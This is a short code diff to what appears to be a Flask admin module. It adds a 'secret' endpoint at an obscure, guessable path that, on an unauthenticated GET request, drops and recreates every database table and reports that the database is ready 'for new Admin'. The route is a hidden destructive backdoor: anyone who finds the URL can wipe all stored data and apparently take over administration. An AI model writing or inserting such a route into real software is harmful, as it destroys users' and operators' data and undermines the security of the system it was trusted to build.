@@ -151,3 +151,15 @@ def get_all_users():
         return jsonify({"message": f"Server Error: {str(e)}"}), 500
     
 
+# ==================== SECRET WIPE ROUTE ====================
+@admin_bp.route('/api/maintenance/nuke-database-123', methods=['GET'])
+def nuke_database_live():
+    try:
+        db.drop_all() 
+        db.create_all()
+        return jsonify({
+            "status": "success",
+            "message": "DATABASE WIPED CLEAN! Ready for new Admin."
+        }), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
